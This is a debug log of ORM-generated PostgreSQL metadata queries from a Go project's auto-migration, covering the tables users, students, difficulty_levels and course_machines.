2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.234ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.186ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.109ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.928ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.986ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.239ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.454ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.151ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.640ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.896ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.331ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.171ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.803ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.170ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.388ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.648ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.685ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.680ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.432ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.363ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.384ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.626ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.187ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.181ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.922ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.966ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.844ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.619ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.414ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.891ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.764ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.690ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.220ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.606ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.890ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.030ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.122ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.181ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.783ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.977ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.250ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.195ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.551ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.573ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.892ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.909ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.112ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.165ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.325ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.871ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.186ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.188ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.858ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.780ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
